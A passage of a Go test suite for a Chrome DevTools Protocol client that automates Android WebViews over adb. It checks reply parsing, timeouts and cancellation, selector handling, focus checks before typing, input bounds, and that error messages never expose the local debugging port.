			_ = c.WriteMessage(websocket.TextMessage, []byte(mk(req["id"].(float64))))
		}
		c := dial(t, f)
		start := time.Now()
		_, err := c.Call(context.Background(), "Runtime.evaluate", nil)
		if !errors.Is(err, ErrMalformedReply) {
			t.Errorf("%s: err = %v", name, err)
		}
		if time.Since(start) > 3*time.Second {
			t.Errorf("%s: the call waited %v for a reply it could never decode", name, time.Since(start))
		}
	}
	// a malformed message that is not ours is skipped, and our own answer still arrives
	f := newFakeCDP(t)
	f.handle = func(c *websocket.Conn, req map[string]any) {
		_ = c.WriteMessage(websocket.TextMessage, []byte(`{"id":9999,"result":NaN}`))
		_ = c.WriteMessage(websocket.TextMessage, []byte(`garbage`))
		answer(c, req, map[string]any{"ok": true})
	}
	c := dial(t, f)
	if _, err := c.Call(context.Background(), "Runtime.evaluate", nil); err != nil {
		t.Fatalf("a malformed message for another id broke the call: %v", err)
	}
}

func TestReplyIDReadsTheIDFromTheFirstBytesOnly(t *testing.T) {
	cases := map[string]int64{
		`{"id":7,"result":{}}`:                7,
		` {  "id" :12 ,"result":NaN}`:         12,
		`{"id":7}`:                            7,
		`{"method":"x","id":7}`:               -1,
		`{"id":"7"}`:                          -1,
		`{"id":-1}`:                           -1,
		`{"id":1234567890123456789012}`:       -1,
		`garbage`:                             -1,
		``:                                    -1,
		`{"id":7abc}`:                         -1,
		`{"id":0,"result":1}`:                 0,
		`{"id":18446744073709551615,"a":1}`:   -1,
		`{"id":99999999999999999,"result":1}`: 99999999999999999,
		`{"id":1234567890123456789,"a":1}`:    -1, // 19 digits: more than an id can be
		strings.Repeat(" ", 100) + `{"id":7}`: -1, // the id must be in the first 64 bytes
	}
	for in, want := range cases {
		if got := replyID([]byte(in)); got != want {
			t.Errorf("replyID(%q) = %d, want %d", in, got, want)
		}
	}
}

func TestWaitForEnforcesItsTotalEvenWhenThePageHangs(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(string) map[string]any { time.Sleep(4 * time.Second); return visibleAt(1, 1, "x") }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	err = s.WaitFor(context.Background(), Text("never"), 300*time.Millisecond) // the connection's own 30 s limit is far away
	var we *WebViewError
	if !errors.As(err, &we) || !strings.Contains(err.Error(), "Timed out") {
		t.Fatalf("err = %v", err)
	}
	if time.Since(start) > 2*time.Second {
		t.Fatalf("the wait took %v although its total was 300 ms", time.Since(start))
	}
}

func TestWaitForObeysTheCallersDeadlineAndCancellationWhileItSleeps(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(string) map[string]any { return map[string]any{"count": 0, "visible": false} }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	// cancelled while it sleeps between two polls
	ctx, cancel := context.WithCancel(context.Background())
	go func() { time.Sleep(100 * time.Millisecond); cancel() }()
	start := time.Now()
	err = s.WaitFor(ctx, Text("never"), time.Minute)
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("err = %v, want canceled", err)
	}
	if time.Since(start) > time.Second {
		t.Fatalf("the cancelled wait took %v", time.Since(start))
	}
	// the caller's deadline is shorter than the wait's total: the caller's error, not a timeout message
	dctx, dcancel := context.WithTimeout(context.Background(), 150*time.Millisecond)
	defer dcancel()
	err = s.WaitFor(dctx, Text("never"), time.Minute)
	if !errors.Is(err, context.DeadlineExceeded) || strings.Contains(err.Error(), "Timed out") {
		t.Fatalf("err = %v, want the caller's deadline", err)
	}
}

func TestTheSelectorKindIsChosenByTheCallerNotGuessedFromTheCharacters(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(string) map[string]any { return visibleAt(10, 10, "x") }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		sel  Selector
		kind string
	}{
		{Text("#1 Item"), "text"},
		{Text(".5 off"), "text"},
		{Text("[beta] feature"), "text"},
		{CSS("#item-1"), "css"},
		{CSS("div > .a"), "css"},
		{Text("plain"), "text"},
	} {
		before := len(p.of("Runtime.callFunctionOn"))
		if _, err := s.Find(context.Background(), c.sel); err != nil {
			t.Fatal(err)
		}
		calls := p.of("Runtime.callFunctionOn")
		args := calls[before].Params["arguments"].([]any)
		if args[0].(map[string]any)["value"] != c.kind || args[1].(map[string]any)["value"] != c.sel.Value {
			t.Errorf("%+v was sent as %v", c.sel, args)
		}
	}
	// an unknown or empty kind is refused before anything is sent
	n := len(p.of("Runtime.callFunctionOn"))
	for _, bad := range []Selector{{Kind: "", Value: "x"}, {Kind: "xpath", Value: "//a"}, {Kind: "TEXT", Value: "x"}} {
		if _, err := s.Find(context.Background(), bad); err == nil {
			t.Errorf("%+v was accepted", bad)
		}
	}
	if len(p.of("Runtime.callFunctionOn")) != n {
		t.Fatal("a selector with an unknown kind was sent")
	}
	// the template decides on the kind, not on the first character
	if strings.Contains(findFunction, "charAt(0)") || !strings.Contains(findFunction, "kind === 'css'") {
		t.Fatal("the template still guesses the kind from the first character")
	}
}

func TestTypeRefusesWhenTheElementDidNotTakeTheFocus(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(string) map[string]any {
		v := visibleAt(5, 5, "")
		v["focused"] = false
		return v
	}
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	err = s.Type(context.Background(), CSS("#readonly"), "secret-text-9")
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "not focusable" || strings.Contains(err.Error(), "secret-text-9") {
		t.Fatalf("err = %v", err)
	}
	if n := len(p.of("Input.insertText")); n != 0 {
		t.Fatalf("text was typed (%d insertText) although the element did not hold the focus", n)
	}
	// a lookup that only finds (mode find) never claims a focus
	p.lookup = func(string) map[string]any { return visibleAt(5, 5, "") }
	if err := s.Type(context.Background(), CSS("#ok"), "typed-here-1"); err != nil {
		t.Fatal(err)
	}
	if n := len(p.of("Input.insertText")); n != 1 {
		t.Fatalf("insertText calls = %d", n)
	}
}

func TestNoLoopbackPortInTheMessages(t *testing.T) {
	f := newFakeCDP(t)
	f.list = func(w http.ResponseWriter, r *http.Request) { http.Error(w, "x", 500) }
	port := strconv.Itoa(f.port)
	_, err := ListTargets(context.Background(), f.port)
	if err == nil || strings.Contains(err.Error(), port) {
		t.Fatalf("ListTargets error: %v", err)
	}
	_, err = ListTargets(context.Background(), 1) // nothing listens: a refused connection
	if err == nil || strings.Contains(err.Error(), "127.0.0.1") || strings.Contains(err.Error(), "port 1") {
		t.Fatalf("refused ListTargets error: %v", err)
	}
	_, err = DialTarget(context.Background(), f.port, Target{WebSocketDebuggerURL: "ws://example.invalid/devtools/page/1"})
	if err == nil || strings.Contains(err.Error(), port) || strings.Contains(err.Error(), "127.0.0.1") {
		t.Fatalf("DialTarget error: %v", err)
	}
}

func TestAWindowLookupWithoutAnObjectIDIsAPageError(t *testing.T) {
	f := newFakeCDP(t)
	f.handle = func(c *websocket.Conn, req map[string]any) {
		answer(c, req, map[string]any{"result": map[string]any{"type": "object"}}) // no objectId
	}
	fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(f.port) + "\n"), nil }}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", Redact: identityRedact})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	_, err = s.Find(context.Background(), Text("x"))
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "page error" || !strings.Contains(err.Error(), "window object") {
		t.Fatalf("err = %v", err)
	}
}

func TestAMalformedReplyIsAPageErrorNotALostConnection(t *testing.T) {
	p := newPageFake(t)
	p.rawReply = func(id float64) string { return fmt.Sprintf(`{"id":%d,"result":NaN}`, int(id)) }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	_, err = s.Find(context.Background(), Text("x"))
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "page error" || !strings.Contains(err.Error(), "could not be read") {
		t.Fatalf("err = %v", err)
	}
	if time.Since(start) > 3*time.Second {
		t.Fatalf("it took %v", time.Since(start))
	}
}

func TestSaneRefusesAZeroViewportAndEachOtherBoundOnItsOwn(t *testing.T) {
	// each case breaks exactly one rule, so each guard in sane is proven alone
	cases := []struct {
		name               string
		x, y, w, h, vw, vh float64
		ok                 bool
	}{
		{"the base case", 10, 10, 20, 20, 100, 200, true},
		{"on the viewport edge", 100, 200, 0, 0, 100, 200, true},
		{"on the origin", 0, 0, 0, 0, 100, 200, true},
		{"zero viewport width with the point at the origin", 0, 10, 20, 20, 0, 200, false},
		{"zero viewport height with the point at the origin", 10, 0, 20, 20, 100, 0, false},
		{"negative viewport width", 10, 10, 20, 20, -1, 200, false},
		{"viewport width over the bound", 10, 10, 20, 20, maxPixels + 1, 200, false},
		{"viewport height over the bound", 10, 10, 20, 20, 100, maxPixels + 1, false},
		{"viewport width at the bound", 10, 10, 20, 20, maxPixels, 200, true},
		{"negative width", 10, 10, -1, 20, 100, 200, false},
		{"negative height", 10, 10, 20, -1, 100, 200, false},
		{"width over the bound", 10, 10, maxPixels + 1, 20, 100, 200, false},
		{"height over the bound", 10, 10, 20, maxPixels + 1, 100, 200, false},
		{"negative x", -0.001, 10, 20, 20, 100, 200, false},
		{"negative y", 10, -0.001, 20, 20, 100, 200, false},
		{"x just past the viewport", 100.001, 10, 20, 20, 100, 200, false},
		{"y just past the viewport", 10, 200.001, 20, 20, 100, 200, false},
		{"x is not a number", math.NaN(), 10, 20, 20, 100, 200, false},
		{"y is infinite", 10, math.Inf(1), 20, 20, 100, 200, false},
		{"w is infinite", 10, 10, math.Inf(-1), 20, 100, 200, false},
		{"viewport height is not a number", 10, 10, 20, 20, 100, math.NaN(), false},
	}
	for _, c := range cases {
		if got := sane(c.x, c.y, c.w, c.h, c.vw, c.vh); got != c.ok {
			t.Errorf("%s: sane = %v, want %v", c.name, got, c.ok)
		}
	}
}

func TestTheMatchCountBoundIsExact(t *testing.T) {
	for _, c := range []struct {
		count int
		ok    bool
	}{{0, true}, {1, true}, {maxMatchCount - 1, true}, {maxMatchCount, true}, {maxMatchCount + 1, false}, {-1, false}} {
		p := newPageFake(t)
		count := c.count
		p.lookup = func(string) map[string]any { return map[string]any{"count": count, "visible": false} }
		s, _, err := sessionFor(t, p, "")
		if err != nil {
			t.Fatal(err)
		}
		_, err = s.Find(context.Background(), Text("x"))
		if (err == nil) != c.ok {
			t.Errorf("count %d: err = %v, want ok=%v", c.count, err, c.ok)
		}
	}
}

func TestDialTargetMessagesNeverContainThePort(t *testing.T) {
	// a refused connection: nothing listens on the port
	l, err := net.Listen("tcp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	closedPort := l.Addr().(*net.TCPAddr).Port
	l.Close()
	check := func(what string, port int, tgt Target) {
		_, err := DialTarget(context.Background(), port, tgt)
		if err == nil {
			t.Fatalf("%s: no error", what)
		}
		if strings.Contains(err.Error(), strconv.Itoa(port)) || strings.Contains(err.Error(), "127.0.0.1") {
			t.Errorf("%s: the error contains the address: %v", what, err)
		}
	}
	check("connection refused", closedPort, Target{WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(closedPort) + "/devtools/page/1"})
	// a handshake the page refuses
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { http.Error(w, "no", http.StatusForbidden) }))
	l2, err := net.Listen("tcp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv.Listener.Close()
	srv.Listener = l2
	srv.Start()
	defer srv.Close()
	p2 := l2.Addr().(*net.TCPAddr).Port
	check("handshake refused", p2, Target{WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p2) + "/devtools/page/1"})
	// addresses that are refused before any connection is made
	check("host that is not loopback", p2, Target{WebSocketDebuggerURL: "ws://example.invalid:" + strconv.Itoa(p2) + "/devtools/page/1"})
	check("other port", p2, Target{WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p2+1) + "/devtools/page/1"})
	check("empty address", p2, Target{})
}

func TestOpenWebViewRefusesANilRedactBeforeTouchingTheDevice(t *testing.T) {
	fa := &fakeAdb{}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	_, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app"})
	if err == nil || !strings.Contains(err.Error(), "Redact") {
		t.Fatalf("err = %v", err)
	}
	if len(ad.calls) != 0 {
		t.Fatalf("the device was touched before the refusal: %v", ad.calls)
	}
}
